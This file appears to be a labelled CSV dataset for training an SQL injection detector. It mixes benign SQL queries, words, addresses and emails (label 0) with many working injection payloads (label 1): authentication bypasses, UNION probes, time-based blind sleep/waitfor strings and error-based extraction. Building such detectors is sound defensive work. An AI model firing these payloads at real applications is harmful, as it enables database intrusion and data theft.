Query,Label
" select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",1
admin' or 1  =  1/*,1
10650,0
SELECT * FROM blood WHERE    NOT have = 'clearly',0
"   SELECT Employees.nails, COUNT ( Orders.paragraphID )  AS soapFROM    ( OrdersINNER JOIN sometime ON Orders.rulerID  =  Employees.danceID ) ",0
SELECT TOP 3 * FROM face WHERE coming = 'suggest',0
SELECT TOP 50 PERCENT * FROM supper,0
"1'  )   where 7561  =  7561 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
-3821'  )   or 9323  =  9323#,1
SELECT * FROM sure WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM shinning WHERE remarkable = 'hung' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM  ( SELECT wing FROM leader ) ,0
"1%'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  '%'  =  '",1
"1'  )   where 6672  =  6672 union all select null,null,null,null,null,null,null,null,null,null--",1
morosa,0
"1'   )    )    as prxm where 1267  =  1267 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1'+  (  select 'arqt' where 2336  =  2336 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
 (  select 2527 from pg_sleep  (  5   )    ) ,1
SELECT * FROM bus WHERE joined = 'breakfast'  AND  ( four = 'arm' OR upon = 'shore' ) ,0
1'  )   as mara where 7164  =  7164,1
"1  )   where 7588  =  7588 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"   SELECT Employees.blew, COUNT ( Orders.sentID )  AS paperFROM    ( OrdersINNER JOIN man ON Orders.girlID  =  Employees.cowID ) ",0
"admin"" or ""1""  =  ""1""/*",1
reco+vero,0
"  UPDATE broad SET moving =  'spin', City =  'mixture' WHERE corn =  which",0
"INSERT INTO to  ( daughter, seldom, being )  VALUES  ( 'forward', 'charge', 'next' )  ",0
select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
SELECT * FROM gate WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM year WHERE reader = 'declared',0
"1"" and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
SELECT CURRENT_TIME (  )  + 1;,0
SELECT * FROM be WHERE yourself BETWEEN forest09/01/1996clearly AND similar15/31/1996think,0
SELECT * FROM become WHERE spend BETWEEN '1996-07-01' AND '1996-07-31',0
seto,0
"-2284%""   )    )    or 9323  =  9323#",1
sal37a,0
 UPDATE society SET dog = 'negative'WHERE tears = 'cold',0
"-2901"" or elt  (  9866  =  9099,9099  )   and ""asib"" like ""asib",1
44315,0
SELECT branch ( s ) FROM completely INNER JOIN,0
SELECT * FROM does WHERE four = 'understanding' LIMIT 3,0
2.84001E+15,0
seniuk,0
"  SELECT * FROM call WHERE flight IN  ( 'become', 'who', 'basket' )  ",0
SELECT accurate ( s )  FROM huge FULL OUTER JOIN,0
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'yhpp' like 'yhpp",1
57186589x,0
"  SELECT STR_TO_DATE ( ""2017,8,14 10,40,10"", ""%Y,%m,%d %h,%i,%s"" ) ;",0
SELECT TOP 50 PERCENT * FROM tin SELECT * FROM here FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM result,0
1'||  (  select 'eyiy' from dual where 8127  =  8127,1
"INSERT INTO life  ( base, complex, wore )  VALUES  ( 'silk', 'success', 'diameter' )  ",0
"INSERT INTO harbor  ( worth, bone, married )  VALUES  ( 'basic', 'negative', 'spell' )  ",0
menospreciativo,0
DELETE FROM by,0
SELECT TOP 3 * FROM plenty WHERE dawn = 'conversation',0
"c/ leopoldo alas ""clarin"" 4, 6?b",0
"1'  )   as taay where 7027  =  7027 and elt  (  4249  =  4249,7259  )  --",1
SELECT offer ( s )  FROM speak LEFT JOIN,0
#NAME?,0
SELECT TOP 3 * FROM second WHERE region = 'expect' SELECT * FROM hard,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c886067718' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
ananas,0
SELECT * FROM anyway WHERE color = 'yet',0
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_doing_cron' LIMIT 1,0
2.88508E+14,0
a24a70re8a,0
1   )    )     )   and 4595  =  4595#,1
"   SELECT hello, prove+ ', ' + listen+ ' ' + complete+ ', ' + calm AS consider  FROM bare",0
SELECT * FROM sit WHERE teach = 'rock',0
1 where 8578  =  8578 and 4770  =  4474--,1
"  SELECT * FROM however WHERE floor IN  ( 'his', 'wealth', 'deeply' )  ",0
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'tfso'  =  'tfso",1
SELECT TOP 50 PERCENT * FROM influence,0
"pl. curro cuchares, 72,",0
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.post_parent  =  367564 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish' OR wp_posts.post_status  =  'trash'  )  )   ORDER BY wp_posts.menu_order ASC,0
lorletha,0
SELECT edge ( s )  FROM tree FULL OUTER JOIN,0
SELECT * FROM dress WHERE foreign NOT BETWEEN 'deer' AND 'away',0
"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",1
SELECT * FROM guard WHERE noted = 'sentence'  AND  ( did = 'fish' OR start = 'page' ) ,0
"guadalajara, 101 4-e",0
"  SELECT level,aid,voyage FROM hidden LEFT JOIN Orders ON age.cannotID =  accept.work ORDER BY outside.train",0
select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
SELECT COUNT ( sea ) FROM fly,0
"iif  (  7953  =  3021,1,1/0  )  ",1
SELECT * FROM condition WHERE basis BETWEEN '1996-07-01' AND '1996-07-31',0
-4331  )   as inpx where 9804  =  9804 union all select 9804#,1
SELECT TOP 3 * FROM shoulder WHERE ought = 'mostly',0
"-4637"" where 8354  =  8354 or 1186  =  2714--",1
SELECT rope,0
 UPDATE stared SET canal = 'drove'WHERE pale = 'store',0
gwohsing,0
DELETE FROM mud,0
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""tgdu""  =  ""tgdu",1
"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",1
"SELECT * FROM union WHERE either BETWEEN ""information"" AND    ""pine""",0
SELECT area ( s )  FROM seems UNION ALL,0
schwuchow9@viajessolomujeres.bj,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28553 )  ORDER BY meta_id ASC",0
SELECT AVG ( motion ) FROM were,0
SELECT * FROM riding WHERE mountain = 'feet'  OR therefore = 'equipment',0
"   SELECT cold, garage, brownFROM orange WHERE coal  IS NOT NULL",0
47494,0
maisa,0
carrer puigmercadal 33 5h,0
7.09479E+15,0
36823414t,0
"jirafa, 165 7?g",0
torrejn de ardoz,0
2.8707E+15,0
-3956'  )   or   (  8459  =  8459  )  *4906 and   (  'rflo' like 'rflo,1
SELECT COUNT ( those ) FROM provide,0
tarpey@bwds.ne,0
SELECT * FROM front,0
segura reygadas,0
goble,0
deli6escenci1,0
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'vnfi'  =  'vnfi,1
-9327'  )   or 3038  =  3038,1
SELECT * FROM anyone 3 SELECT * FROM base,0
"1%"" and 9198  =  9198--",1
weld@yiutuve.vc,0
10970,0
"1%"" rlike sleep  (  5  )  #",1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk""  =  ""jkfk",1
"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'lwrk' like 'lwrk",1
SELECT * FROM table FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM east,0
-7779'  )   where 4976  =  4976 or 6872  =  6872--,1
1'||  (  select 'tjzy' where 3037  =  3037,1
filis,0
"1%""   )    )    union all select null,null,null,null#",1
SELECT education,0
SELECT * FROM long WHERE examine = 'log',0
"glorieta puerta de hierro, 57",0
SELECT AVG ( television ) FROM thrown,0
"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",1
"1 where 5266  =  5266 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"-7793""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  ""lias""  =  ""lias",1
SELECT neighbor ( s )  FROM wide UNION ALL,0
"  SELECT gray,vessels,eventually FROM effect LEFT JOIN Orders ON create.duckID =  itself.instead ORDER BY tales.degree",0
FROM  ( SELECT DISTINCT friendly FROM invented ) ,0
1  )   where 6725  =  6725 and 1553  =  7419,1
SELECT instrument FROM way UNION SELECT vast FROM sport ORDER BY rubber,0
gail,0
bunyola,0
"1 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
1  )   or sleep  (  5  )   and   (  2211  =  2211,1
SELECT * FROM traffic  WHERE deal NOT LIKE '[over]%',0
SELECT * FROM count WHERE right = 'tune'  AND City = 'how',0
"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""uisi""  =  ""uisi",1
sant carles de la rpita,0
SELECT * FROM beginning ORDER BY flight DESC,0
"select sleep  (  5  )   and ""irxg""  =  ""irxg",1
"  SELECT MINUTE ( ""23:59:59"" ) ;",0
moloney@imarbella.travel,0
SELECT * FROM mother WHERE mark = 'thrown'  AND  ( cap = 'half' OR flag = 'factor' ) ,0
antulio,0
SELECT camera ( s )  FROM principle,0
mozek,0
nelber,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 179 )  ORDER BY meta_id ASC",0
-3899'  )   where 8152  =  8152 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
SELECT COUNT ( DISTINCT say )  FROM blind,0
38847166m,0
SELECT * FROM end 3,0
1'  )   and sleep  (  5  )   and   (  'orxt'  =  'orxt,1
select   (  case when   (  9030  =  6952  )   then 1 else 9030*  (  select 9030 from master..sysdatabases  )   end  )  --,1
" SELECT * FROM mostly ORDER BY useful ASC, arrive DESC",0
"   SELECT Employees.means, COUNT ( Orders.actuallyID )  AS hurryFROM    ( OrdersINNER JOIN effort ON Orders.appliedID  =  Employees.tankID ) ",0
9.57318E+15,0
SELECT AVG ( Price ) FROM Products;,0
SELECT COUNT ( sonID ) FROM skin,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # cdjm",1
"1   )    )    as zmsa where 6909  =  6909 union all select null,null,null,null,null,null,null#",1
SELECT * FROM law ORDER BY line DESC,0
!,1
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",1
SELECT AVG ( twice ) FROM fair,0
"  SELECT TIME ( ""2017-08-15 19:30:10"" ) ;",0
SELECT COUNT ( DISTINCT swam )  FROM produce,0
SELECT * FROM take WHERE country NOT BETWEEN 'deer' AND 'military',0
"SELECT DATE_SUB ( ""2017-06-15 09:34:21"", INTERVAL 15 MINUTE ) ;",0
"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  """,1
SELECT TOP 50 PERCENT * FROM floor SELECT * FROM sort FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM snake,0
SELECT AVG ( lips ) FROM simply,0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND t.slug IN  ( 'support-family' ) ",0
"   SELECT listen,income,neck,warn,quietly     (  (  spirit JOIN girl ON jar.dress =  burst.sound )   INNER JOIN stomachON Orders.solid =  voyage.pastID ) ",0
SELECT DISTINCT day FROM one,0
"1""  )   as esks where 1138  =  1138",1
imperial 143,0
"-3081""   )    )     )   or 3736  =  1899",1
50529,0
"  SELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDateFROM OrdersINNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;",0
"1',  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",1
"1  )   as bgvd where 1753  =  1753 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-8347%'  )   union all select 7643,7643,7643--",1
"calle la paz, 88,",0
"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'dhoo' like 'dhoo",1
SELECT * FROM expect WHERE chose IN  ( SELECT unit FROM merely ) ,0
"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'bemh'  =  'bemh",1
SELECT AVG ( decide ) FROM recently SELECT SUM ( classroom ) ,0
sobrecogimiento,0
"-9208%""   )    )    or 8571  =  8571--",1
guino osarte,0
DELETE FROM headed,0
waitfor delay '0:0:5'  )  ||',1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 347682 )  ORDER BY meta_id ASC",0
"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh",1
50491,0
"  (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1
SELECT hand ( s )  FROM mine LEFT JOIN,0
"c/ peru, 85, 10?h",0
" SELECT RIGHT ( CustomerName, 5 )  AS ExtractString FROM Customers;",0
SELECT * FROM vapor WHERE Price NOT BETWEEN 10 AND 20,0
5.68541E+15,0
barcario,0
"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",1
SELECT rhythm ( s FROM carried RIGHT JOIN,0
" SELECT * FROM official ORDER BY corn ASC, taken DESC",0
1' in boolean mode  )   rlike sleep  (  5  )  #,1
schiavelli@buscadordevideos.mk,0
"  SELECT riding,brush FROM value WHERE above = 'family' UNION SELECT thread, supply FROM liquid",0
SELECT * FROM bear WHERE magic BETWEEN 'fort' AND 'typical',0
SELECT TOP 3 * FROM owner WHERE business = 'lunch',0
ridgely.loyat@cbgerindote.sk,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'afdy' like 'afdy",1
"1'   )    )    as ewyk where 4828  =  4828 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"-5181""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""qofp""  =  ""qofp",1
"1   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   5336  =  5336",1
kinsey@etnics.fm,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c839e379ee' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"  SELECT strong,degree FROM shut WHERE specific = 'chest' UNION SELECT gun, traffic FROM won",0
"-9697  )   union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",1
1.62177E+15,0
SELECT * FROM office FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM feel,0
"1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
"INSERT INTO stay  ( caught, mainly, find )  VALUES  ( 'model', 'mean', 'giving' )  ",0
scheifel2,0
"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",1
"-4947' in boolean mode  )   union all select 3314,3314#",1
SELECT * FROM shade WHERE heading NOT BETWEEN 'straight' AND 'written',0
SELECT * FROM water ORDER BY service,0
"   SELECT COUNT ( palace ) , important FROM congress BY pool",0
"  SELECT tightID AS ID, bar AS easier FROM consist",0
SELECT AVG ( Price ) FROM angry,0
SELECT * FROM language WHERE vote NOT LIKE 'tobacco%',0
SELECT * FROM recently 3 SELECT * FROM excellent,0
SELECT TOP 3 * FROM map WHERE island = 'mission' SELECT * FROM cutting,0
"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"   SELECT COUNT ( by ) , trap FROM somebody BY community",0
"-6108'  )   union all select 2519,2519,2519,2519--",1
 UPDATE basic SET frozen = 'bean'WHERE examine = 'row',0
"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'zcey'  =  'zcey",1
lora@rocofer.jobs,0
"-5761""  )   or 3762  =  1274",1
19277,0
"   SELECT mouth, swimming, herself FROM dangerous WHERE leaving  IS NULL",0
ben,0
montell i martinet,0
-6145 or   (  8459  =  8459  )  *4906-- yklv,1
gift@distritoeste.no,0
09069193v,0
SELECT came ( s )  FROM wild SELECT if FROM temperature,0
-6764'  )   or 2314  =  2017--,1
analfabetismo,0
"1""   )    )    as phis where 4420  =  4420 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM search WHERE command  BETWEEN 10 AND 20,0
"-4032""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""olox""  =  ""olox",1
^',1
5366,0
"   SELECT television, rule, surfaceFROM consonant WHERE hunt  IS NOT NULL",0
"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",1
"1""  )   as semi where 4260  =  4260",1
1'   )    )    as vrwr where 3830  =  3830,1
"1',  (  select   (  case when   (  3576  =  7744  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1
